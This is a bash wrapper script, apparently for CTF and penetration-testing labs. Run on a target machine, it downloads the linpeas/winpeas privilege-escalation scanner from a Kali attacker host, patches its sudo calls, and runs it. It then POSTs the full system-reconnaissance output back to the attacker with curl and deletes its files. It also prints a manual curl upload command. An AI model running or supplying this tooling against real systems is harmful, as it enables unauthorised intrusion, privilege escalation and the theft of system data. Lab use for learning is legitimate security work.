#!/bin/bash
#
# ParsingPeas Wrapper Script
# Runs linpeas/winpeas and automatically sends output to Kali host
# NOTE: Downloads scripts from Kali host (for isolated CTF environments)
#

SERVER_URL="KALI_SERVER_URL"  # Will be replaced by receiver.py
SESSION_ID="scan_$(date +%s)_$$"
HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
TMP_OUTPUT="/tmp/.linpeas_$(date +%s).tmp"

echo "[*] ParsingPeas - Automated Privilege Escalation Scanner"
echo "[*] Session ID: $SESSION_ID"
echo "[*] Hostname: $HOSTNAME"
echo "[*] Server: $SERVER_URL"
echo ""

# Check for curl
if ! command -v curl &> /dev/null; then
    echo "[!] Error: curl not found. Trying wget..."
    if ! command -v wget &> /dev/null; then
        echo "[!] Error: Neither curl nor wget available. Exiting."
        exit 1
    fi
    USE_WGET=1
fi

# Detect OS
if [[ "$OSTYPE" == "linux-gnu"* ]] || [[ "$OSTYPE" == "darwin"* ]] || [[ -z "$OSTYPE" ]]; then
    SCAN_TYPE="linpeas"
    echo "[*] Detected: Linux/Unix system"
    SCRIPT_ENDPOINT="$SERVER_URL/get-linpeas"
    SCRIPT_PATH="/tmp/linpeas.sh"
else
    SCAN_TYPE="winpeas"
    echo "[*] Detected: Windows system"
    SCRIPT_ENDPOINT="$SERVER_URL/get-winpeas"
    SCRIPT_PATH="/tmp/winpeas.exe"
fi

echo "[*] Downloading $SCAN_TYPE from Kali host..."

# Download script from Kali host (NOT from internet!)
if [[ $USE_WGET ]]; then
    wget -q -O "$SCRIPT_PATH" "$SCRIPT_ENDPOINT" || { echo "[!] Download failed"; exit 1; }
else
    curl -sSL "$SCRIPT_ENDPOINT" -o "$SCRIPT_PATH" --max-time 30 || { echo "[!] Download failed"; exit 1; }
fi

if [[ ! -f "$SCRIPT_PATH" ]] || [[ ! -s "$SCRIPT_PATH" ]]; then
    echo "[!] Error: Script download failed or empty"
    exit 1
fi

echo "[+] Downloaded successfully"

# Patch linpeas to use non-interactive sudo (prevents password prompt hangs)
if [[ $SCAN_TYPE == "linpeas" ]]; then
    echo "[*] Patching linpeas for non-interactive mode..."
    sed -i 's/sudo -l/sudo -n -l 2>\/dev\/null/g' "$SCRIPT_PATH"
    sed -i 's/sudo -v/sudo -n -v 2>\/dev\/null/g' "$SCRIPT_PATH"
    echo "[+] Patching complete"
fi

# Make executable and run
if [[ $SCAN_TYPE == "linpeas" ]]; then
    chmod +x "$SCRIPT_PATH"
    
    echo "[*] Running linpeas (this may take 2-5 minutes)..."
    echo "[*] Output is being saved to file..."
    echo ""
    
    # Run linpeas directly to file (no pipe/tee to avoid hanging)
    "$SCRIPT_PATH" > "$TMP_OUTPUT" 2>&1 &
    LINPEAS_PID=$!
    
    # Show progress while it runs
    echo "[*] Linpeas running (PID: $LINPEAS_PID)..."
    while kill -0 $LINPEAS_PID 2>/dev/null; do
        if [[ -f "$TMP_OUTPUT" ]]; then
            CURRENT_SIZE=$(stat -f%z "$TMP_OUTPUT" 2>/dev/null || stat -c%s "$TMP_OUTPUT" 2>/dev/null || echo "0")
            echo -ne "\r[*] Output size: $((CURRENT_SIZE / 1024)) KB   "
        fi
        sleep 2
    done
    
    # Wait for process to fully complete
    wait $LINPEAS_PID
    EXIT_CODE=$?
    
    echo ""
    echo "[+] Linpeas completed with exit code: $EXIT_CODE"
    
    # Check if output was generated
    if [[ ! -f "$TMP_OUTPUT" ]] || [[ ! -s "$TMP_OUTPUT" ]]; then
        echo "[!] Error: No output generated"
        exit 1
    fi
    
    OUTPUT_SIZE=$(stat -f%z "$TMP_OUTPUT" 2>/dev/null || stat -c%s "$TMP_OUTPUT" 2>/dev/null)
    echo "[+] Final output size: $((OUTPUT_SIZE / 1024)) KB"
    echo ""
    echo "[*] Last 10 lines of output:"
    echo "----------------------------------------"
    tail -10 "$TMP_OUTPUT"
    echo "----------------------------------------"
    echo ""
    echo "[*] Transferring to Kali host..."
    echo ""
    
    # Send to Kali with retry logic and progress bar
    MAX_RETRIES=3
    RETRY_COUNT=0
    
    while [[ $RETRY_COUNT -lt $MAX_RETRIES ]]; do
        echo "[*] Upload attempt $((RETRY_COUNT + 1))/$MAX_RETRIES"
        
        # Use curl with progress bar
        HTTP_CODE=$(curl -X POST \
            -H "X-Session-ID: $SESSION_ID" \
            -H "X-Hostname: $HOSTNAME" \
            -H "X-Scan-Type: $SCAN_TYPE" \
            -H "Content-Type: text/plain" \
            --data-binary "@$TMP_OUTPUT" \
            --connect-timeout 10 \
            --max-time 120 \
            -o /tmp/.upload_response.json \
            -w "%{http_code}" \
            --progress-bar \
            "$SERVER_URL/upload")
        
        echo ""
        
        if [[ "$HTTP_CODE" == "200" ]]; then
            echo "[+] Transfer successful!"
            
            # Try to extract report URL from response
            if [[ -f /tmp/.upload_response.json ]]; then
                REPORT_URL=$(grep -o '"report_url":"[^"]*"' /tmp/.upload_response.json 2>/dev/null | cut -d'"' -f4)
                if [[ -n "$REPORT_URL" ]]; then
                    echo "[+] View report at: $SERVER_URL$REPORT_URL"
                fi
            fi
            
            echo "[+] Cleaning up..."
            rm -f "$SCRIPT_PATH" "$TMP_OUTPUT" /tmp/.upload_response.json
            echo "[+] Done!"
            exit 0
        else
            RETRY_COUNT=$((RETRY_COUNT + 1))
            echo "[!] Transfer failed with HTTP code: $HTTP_CODE"
            if [[ $RETRY_COUNT -lt $MAX_RETRIES ]]; then
                echo "[*] Retrying in 2 seconds..."
                sleep 2
            fi
        fi
    done
    
    echo "[!] Transfer failed after $MAX_RETRIES attempts"
    echo "[*] Output saved locally at: $TMP_OUTPUT"
    echo "[*] You can manually transfer with:"
    echo "    curl -X POST -H 'X-Hostname: $HOSTNAME' --data-binary @$TMP_OUTPUT $SERVER_URL/upload"
    exit 1
fi

echo "[!] Windows support coming soon!"
exit 1
